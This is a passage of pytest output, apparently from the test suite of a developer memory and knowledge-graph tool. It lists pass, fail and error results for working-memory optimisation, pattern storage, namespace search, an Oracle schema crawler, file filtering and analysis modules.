tests/tier1/test_working_memory.py::TestSearchAndQuery::test_finds_conversations_by_entity PASSED [ 81%]
tests/tier1/test_working_memory.py::TestSearchAndQuery::test_gets_conversations_by_date_range PASSED [ 81%]
tests/tier1/test_working_memory.py::TestSearchAndQuery::test_gets_entity_usage_statistics PASSED [ 81%]
tests/tier1/test_working_memory.py::TestMessagesStorage::test_stores_all_messages PASSED [ 81%]
tests/tier1/test_working_memory.py::TestMessagesStorage::test_appends_new_messages PASSED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestConfigurationLoading::test_load_default_config_when_file_missing PASSED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestConfigurationLoading::test_load_config_from_file PASSED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestConfigurationLoading::test_graceful_config_load_failure PASSED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestContextOptimization::test_get_optimized_context_with_active_conversation FAILED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestContextOptimization::test_get_optimized_context_with_specific_conversation FAILED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestContextOptimization::test_get_optimized_context_with_pattern_context FAILED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestContextOptimization::test_get_optimized_context_with_custom_target_reduction FAILED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestContextOptimization::test_get_optimized_context_when_disabled PASSED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestContextOptimization::test_build_context_with_no_conversations FAILED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestCacheHealthIntegration::test_cache_health_check_on_context_retrieval FAILED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestCacheHealthIntegration::test_get_cache_health_report PASSED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestTokenMetricsIntegration::test_metrics_recorded_on_optimization FAILED [ 81%]
tests/tier1/test_working_memory_optimization.py::TestTokenMetricsIntegration::test_get_token_metrics_summary FAILED [ 82%]
tests/tier1/test_working_memory_optimization.py::TestPerformanceTargets::test_optimization_overhead_under_50ms FAILED [ 82%]
tests/tier1/test_working_memory_optimization.py::TestPerformanceTargets::test_optimization_overhead_multiple_conversations FAILED [ 82%]
tests/tier1/test_working_memory_optimization.py::TestQualityTargets::test_quality_score_above_threshold FAILED [ 82%]
tests/tier1/test_working_memory_optimization.py::TestQualityTargets::test_quality_maintained_with_high_reduction FAILED [ 82%]
tests/tier1/test_working_memory_optimization.py::TestTokenEstimation::test_estimate_tokens_with_simple_context PASSED [ 82%]
tests/tier1/test_working_memory_optimization.py::TestTokenEstimation::test_estimate_tokens_with_complex_context FAILED [ 82%]
tests/tier1/test_working_memory_optimization.py::TestEdgeCases::test_optimization_with_empty_conversation FAILED [ 82%]
tests/tier1/test_working_memory_optimization.py::TestEdgeCases::test_optimization_with_none_conversation_id FAILED [ 82%]
tests/tier1/test_working_memory_optimization.py::TestEdgeCases::test_optimization_with_invalid_target_reduction FAILED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseConnection::test_creates_database_file PASSED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseConnection::test_creates_parent_directories PASSED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseConnection::test_get_connection_returns_connection PASSED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseConnection::test_connection_has_row_factory PASSED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseConnection::test_connection_is_cached PASSED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseConnection::test_close_closes_connection PASSED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseConnection::test_context_manager_support PASSED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestSchemaInitialization::test_creates_patterns_table PASSED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestSchemaInitialization::test_creates_pattern_relationships_table PASSED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestSchemaInitialization::test_creates_pattern_tags_table PASSED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestSchemaInitialization::test_creates_confidence_decay_log_table PASSED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestSchemaInitialization::test_creates_fts5_virtual_table PASSED [ 82%]
tests/tier2/knowledge_graph/test_database.py::TestSchemaInitialization::test_creates_indexes PASSED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestSchemaInitialization::test_schema_is_idempotent PASSED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseConstraints::test_pattern_id_is_unique PASSED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseConstraints::test_confidence_must_be_between_0_and_1 PASSED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseConstraints::test_scope_must_be_valid PASSED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseMigrations::test_migrate_returns_version_tuple PASSED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseMigrations::test_migrate_with_no_changes_is_noop PASSED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseMigrations::test_schema_version_is_tracked PASSED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseHealthCheck::test_health_check_returns_dict PASSED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseHealthCheck::test_health_check_has_status PASSED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseHealthCheck::test_health_check_has_timestamp PASSED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseHealthCheck::test_health_check_detects_corrupted_database PASSED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabaseHealthCheck::test_health_check_detects_corrupted_database ERROR [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabasePerformance::test_connection_establishment_is_fast FAILED [ 83%]
tests/tier2/knowledge_graph/test_database.py::TestDatabasePerformance::test_schema_creation_is_fast PASSED [ 83%]
tests/tier2/knowledge_graph/test_pattern_store.py::test_store_and_get_pattern PASSED [ 83%]
tests/tier2/knowledge_graph/test_pattern_store.py::test_duplicate_pattern_id_raises PASSED [ 83%]
tests/tier2/knowledge_graph/test_pattern_store.py::test_update_pattern_confidence PASSED [ 83%]
tests/tier2/knowledge_graph/test_pattern_store.py::test_list_patterns_with_filters PASSED [ 83%]
tests/tier2/knowledge_graph/test_pattern_store.py::test_delete_pattern PASSED [ 83%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternStoreInitialization::test_pattern_store_requires_db PASSED [ 83%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternStoreInitialization::test_pattern_store_has_db_reference PASSED [ 83%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternStorage::test_store_pattern_with_minimal_data PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternStorage::test_store_pattern_with_all_fields PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternStorage::test_store_pattern_validates_confidence_range PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternStorage::test_store_pattern_validates_scope PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternStorage::test_store_pattern_sets_timestamps PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternStorage::test_store_pattern_initializes_access_count PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternRetrieval::test_get_pattern_returns_stored_pattern PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternRetrieval::test_get_pattern_returns_none_if_not_found PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternRetrieval::test_get_pattern_updates_access_timestamp PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternRetrieval::test_get_pattern_increments_access_count PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternUpdates::test_update_pattern_changes_title PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternUpdates::test_update_pattern_changes_confidence PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternUpdates::test_update_pattern_changes_metadata PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternUpdates::test_update_pattern_protects_pattern_id PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternUpdates::test_update_pattern_returns_false_if_not_found PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternUpdates::test_update_pattern_returns_false_if_no_updates PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternDeletion::test_delete_pattern_removes_pattern PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternDeletion::test_delete_pattern_returns_false_if_not_found PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternListing::test_list_patterns_returns_all_patterns PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternListing::test_list_patterns_filters_by_type PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternListing::test_list_patterns_filters_by_scope PASSED [ 84%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternListing::test_list_patterns_filters_by_confidence PASSED [ 85%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternListing::test_list_patterns_respects_limit PASSED [ 85%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternListing::test_list_patterns_orders_by_confidence_and_access PASSED [ 85%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternPerformance::test_pattern_storage_is_fast PASSED [ 85%]
tests/tier2/knowledge_graph/test_pattern_store.py::TestPatternPerformance::test_pattern_retrieval_is_fast PASSED [ 85%]
tests/tier2/test_amnesia.py::TestNamespaceDeletion::test_delete_by_namespace PASSED [ 85%]
tests/tier2/test_amnesia.py::TestNamespaceDeletion::test_block_cortex_core_deletion PASSED [ 85%]
tests/tier2/test_amnesia.py::TestNamespaceDeletion::test_never_delete_generic_patterns PASSED [ 85%]
tests/tier2/test_amnesia.py::TestNamespaceDeletion::test_multi_namespace_safety PASSED [ 85%]
tests/tier2/test_amnesia.py::TestNamespaceDeletion::test_dry_run_namespace_deletion PASSED [ 85%]
tests/tier2/test_amnesia.py::TestConfidenceDeletion::test_delete_by_confidence PASSED [ 85%]
tests/tier2/test_amnesia.py::TestConfidenceDeletion::test_confidence_deletion_protects_generic PASSED [ 85%]
tests/tier2/test_amnesia.py::TestAgeDeletion::test_delete_by_age PASSED  [ 85%]
tests/tier2/test_amnesia.py::TestAgeDeletion::test_age_deletion_protects_generic PASSED [ 85%]
tests/tier2/test_amnesia.py::TestScopeClear::test_clear_application_scope PASSED [ 85%]
tests/tier2/test_amnesia.py::TestScopeClear::test_scope_clear_requires_confirmation PASSED [ 85%]
tests/tier2/test_amnesia.py::TestScopeClear::test_scope_clear_dry_run PASSED [ 85%]
tests/tier2/test_amnesia.py::TestSafetyProtections::test_safety_threshold_prevents_mass_deletion PASSED [ 85%]
tests/tier2/test_amnesia.py::TestSafetyProtections::test_cortex_core_namespace_always_protected PASSED [ 85%]
tests/tier2/test_amnesia.py::TestDeletionPreview::test_get_deletion_preview PASSED [ 85%]
tests/tier2/test_amnesia.py::TestDeletionPreview::test_preview_with_confidence_filter PASSED [ 85%]
tests/tier2/test_amnesia.py::TestDeletionLogging::test_deletion_log_recorded PASSED [ 86%]
tests/tier2/test_amnesia.py::TestDeletionLogging::test_export_deletion_log PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestDatabaseInitialization::test_creates_database_file PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestDatabaseInitialization::test_creates_all_tables PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestDatabaseInitialization::test_creates_fts5_virtual_table PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestPatternManagement::test_adds_pattern PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestPatternManagement::test_gets_pattern_by_id PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestPatternManagement::test_updates_pattern PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestPatternManagement::test_deletes_pattern PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestPatternManagement::test_lists_patterns_by_type PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestPatternManagement::test_updates_access_timestamp PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestFTS5Search::test_simple_keyword_search PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestFTS5Search::test_phrase_search PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestFTS5Search::test_boolean_search PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestFTS5Search::test_prefix_search PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestFTS5Search::test_search_ranking_by_relevance PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestPatternRelationships::test_links_two_patterns PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestPatternRelationships::test_gets_related_patterns PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestPatternRelationships::test_traverses_graph_multi_level PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestPatternRelationships::test_detects_circular_relationships PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestConfidenceDecay::test_applies_decay_based_on_age PASSED [ 86%]
tests/tier2/test_knowledge_graph.py::TestConfidenceDecay::test_deletes_low_confidence_patterns PASSED [ 87%]
tests/tier2/test_knowledge_graph.py::TestConfidenceDecay::test_protects_pinned_patterns PASSED [ 87%]
tests/tier2/test_knowledge_graph.py::TestConfidenceDecay::test_tracks_decay_history PASSED [ 87%]
tests/tier2/test_knowledge_graph.py::TestTagManagement::test_adds_tags_to_pattern PASSED [ 87%]
tests/tier2/test_knowledge_graph.py::TestTagManagement::test_finds_patterns_by_tag PASSED [ 87%]
tests/tier2/test_knowledge_graph.py::TestTagManagement::test_gets_tag_cloud PASSED [ 87%]
tests/tier2/test_namespace_boundaries.py::test_invalid_scope_rejected PASSED [ 87%]
tests/tier2/test_namespace_boundaries.py::test_cortex_vs_application_lists PASSED [ 87%]
tests/tier2/test_namespace_boundaries.py::test_namespace_isolation_in_search PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestNamespaceAwareSearch::test_search_with_current_namespace_boost PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestNamespaceAwareSearch::test_generic_patterns_always_included PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestNamespaceAwareSearch::test_generic_patterns_excluded_when_disabled PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestNamespaceAwareSearch::test_cross_namespace_isolation PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestNamespaceAwareSearch::test_multi_namespace_patterns_boosted_for_all PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestNamespaceAwareSearch::test_search_without_namespace_context PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestGetPatternsByNamespace::test_get_ksessions_patterns PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestGetPatternsByNamespace::test_get_noor_patterns PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestGetPatternsByNamespace::test_get_cortex_core_patterns PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestGetPatternsByNamespace::test_get_nonexistent_namespace PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestGetGenericPatterns::test_get_all_generic_patterns PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestGetGenericPatterns::test_generic_patterns_sorted_by_confidence PASSED [ 87%]
tests/tier2/test_namespace_search.py::TestGetApplicationPatterns::test_get_all_application_patterns PASSED [ 88%]
tests/tier2/test_namespace_search.py::TestGetApplicationPatterns::test_application_patterns_exclude_generic PASSED [ 88%]
tests/tier2/test_namespace_search.py::TestNamespaceBoostingScores::test_current_namespace_highest_priority PASSED [ 88%]
tests/tier2/test_namespace_search.py::TestNamespaceBoostingScores::test_generic_patterns_medium_priority PASSED [ 88%]
tests/tier2/test_namespace_search.py::TestEmptyResults::test_search_no_matches PASSED [ 88%]
tests/tier2/test_namespace_search.py::TestEmptyResults::test_namespace_with_no_patterns PASSED [ 88%]
tests/tier2/test_namespace_search.py::TestEmptyResults::test_empty_database_generic_patterns PASSED [ 88%]
tests/tier2/test_namespace_search.py::TestLimitParameter::test_limit_respected_in_namespace_search PASSED [ 88%]
tests/tier2/test_namespace_search.py::TestLimitParameter::test_limit_larger_than_results PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestOracleCrawlerInit::test_initializes_with_connection_params PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestOracleCrawlerInit::test_extracts_namespace_from_dsn PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestOracleCrawlerInit::test_accepts_custom_namespace PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestOracleConnection::test_connects_to_oracle PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestOracleConnection::test_handles_connection_failure PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestOracleConnection::test_disconnects_from_oracle PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestSchemaExtraction::test_extracts_tables_for_current_user PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestSchemaExtraction::test_extracts_columns_with_metadata PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestSchemaExtraction::test_extracts_indexes_with_columns PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestSchemaExtraction::test_extracts_foreign_key_constraints PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestPatternConversion::test_converts_table_to_pattern PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestPatternConversion::test_pattern_includes_foreign_key_references PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestTier2Integration::test_stores_patterns_in_knowledge_graph PASSED [ 88%]
tests/tier2/test_oracle_crawler.py::TestTier2Integration::test_handles_multiple_tables PASSED [ 89%]
tests/tier2/test_oracle_crawler.py::TestTier2Integration::test_uses_custom_namespace PASSED [ 89%]
tests/tier2/test_oracle_crawler.py::TestErrorHandling::test_requires_connection_before_extract PASSED [ 89%]
tests/tier2/test_oracle_crawler.py::TestErrorHandling::test_handles_empty_schema PASSED [ 89%]
tests/tier2/test_oracle_crawler.py::TestErrorHandling::test_handles_storage_failure PASSED [ 89%]
tests/tier2/test_oracle_crawler.py::TestOracleIntegration::test_real_oracle_connection SKIPPED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_detect_documentation_pattern PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_detect_rst_documentation PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_detect_config_json PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_detect_config_yaml PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_detect_config_env PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_detect_feature_created PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_detect_refactor_deleted PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_detect_bugfix_small_change PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_detect_refactor_balanced_changes PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_detect_feature_many_additions PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_detect_unknown_no_diff PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_cache_git_diff PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_cache_size_limit PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_handle_git_not_available PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_handle_git_timeout PASSED [ 89%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_handle_malformed_event PASSED [ 90%]
tests/tier2/test_pattern_detector.py::TestChangePatternDetector::test_clear_cache PASSED [ 90%]
tests/tier2/test_pattern_detector.py::TestPatternDetectorIntegration::test_pattern_types_defined PASSED [ 90%]
tests/tier2/test_pattern_detector.py::TestPatternDetectorIntegration::test_all_patterns_are_strings PASSED [ 90%]
tests/tier2/test_plan_schemas.py::test_plan_ledger_happy_path PASSED     [ 90%]
tests/tier2/test_plan_schemas.py::test_plan_ledger_missing_id_invalid PASSED [ 90%]
tests/tier2/test_plan_schemas.py::test_active_plans_feature_happy PASSED [ 90%]
tests/tier2/test_plan_schemas.py::test_decision_graph_happy PASSED       [ 90%]
tests/tier2/test_plan_schemas.py::test_reasoning_chain_entry_happy PASSED [ 90%]
tests/tier2/test_plan_schemas.py::test_test_alignment_happy PASSED       [ 90%]
tests/tier2/test_plan_schemas.py::test_metrics_forecast_happy PASSED     [ 90%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_python_file PASSED [ 90%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_typescript_file PASSED [ 90%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_config_file PASSED [ 90%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_documentation PASSED [ 90%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_created_file PASSED [ 90%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_deleted_file PASSED [ 90%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_modified_file PASSED [ 90%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_feature_pattern PASSED [ 90%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_bugfix_pattern PASSED [ 90%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_core_source PASSED [ 90%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_test_files PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_scripts PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_docs_path PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_high_priority_change PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_low_priority_change PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_capped_at_100 PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_unknown_pattern PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_unknown_file_type PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestActivityScorer::test_score_malformed_event PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_summarize_created_event PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_summarize_modified_event PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_summarize_deleted_event PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_summarize_high_priority_event PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_summarize_normal_priority_event PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_summarize_empty_batch PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_summarize_single_event_batch PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_summarize_multi_event_batch PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_batch_summary_includes_avg_score PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_summarize_session PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_session_summary_includes_high_priority PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_session_summary_includes_top_files PASSED [ 91%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_summarize_malformed_event PASSED [ 92%]
tests/tier2/test_scorer_summarizer.py::TestAutoSummarizer::test_summarize_long_filenames PASSED [ 92%]
tests/tier2/test_scorer_summarizer.py::TestScorerSummarizerIntegration::test_score_and_summarize_flow PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_pycache PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_pyc_files PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_node_modules FAILED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_dist_build FAILED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_temp_files PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_swap_files PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_ds_store PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_generated_marker PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_autogenerated_marker PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_generated_directory FAILED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_git_directory FAILED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_vscode_files FAILED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_idea_files FAILED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_large_files PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_empty_files PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_allow_normal_size_files PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filter_binary_files PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_allow_python_source PASSED [ 92%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_allow_markdown_docs PASSED [ 93%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_allow_json_config PASSED [ 93%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_allow_yaml_files PASSED [ 93%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_cache_generated_marker_check PASSED [ 93%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_cache_size_limit PASSED [ 93%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_filtering_performance PASSED [ 93%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_handle_nonexistent_file PASSED [ 93%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_handle_permission_error PASSED [ 93%]
tests/tier2/test_smart_filter.py::TestSmartFileFilter::test_handle_unicode_filename PASSED [ 93%]
tests/tier2/test_smart_filter.py::TestSmartFilterIntegration::test_filter_stats PASSED [ 93%]
tests/tier3/analysis/test_insight_generator.py::TestInsight::test_insight_creation FAILED [ 93%]
tests/tier3/analysis/test_insight_generator.py::TestInsightType::test_insight_types PASSED [ 93%]
tests/tier3/analysis/test_insight_generator.py::TestSeverity::test_severity_levels PASSED [ 93%]
tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_generator_initialization ERROR [ 93%]
tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_generate_velocity_insights_no_data ERROR [ 93%]
tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_generate_velocity_insights_with_data ERROR [ 93%]
tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_generate_hotspot_insights_no_data ERROR [ 93%]
tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_generate_hotspot_insights_with_data ERROR [ 93%]
tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_generate_all_insights ERROR [ 93%]
tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_insight_severity_assignment ERROR [ 93%]
tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_insight_recommendations ERROR [ 93%]
tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_empty_insights_handling ERROR [ 94%]
tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_insight_data_structure ERROR [ 94%]
tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_multiple_insight_types ERROR [ 94%]
tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_analyzer_initialization FAILED [ 94%]
tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_calculate_velocity_with_data FAILED [ 94%]
tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_calculate_velocity_empty_data FAILED [ 94%]
tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_analyze_trends_with_data FAILED [ 94%]
tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_velocity_calculation_accuracy FAILED [ 94%]
tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_trend_direction_increasing FAILED [ 94%]
tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_date_range_filtering FAILED [ 94%]
tests/tier3/analysis/test_velocity_analyzer.py::TestVelocityAnalyzer::test_velocity_with_zero_days FAILED [ 94%]
tests/tier3/metrics/test_file_metrics.py::TestFileHotspot::test_file_hotspot_creation PASSED [ 94%]
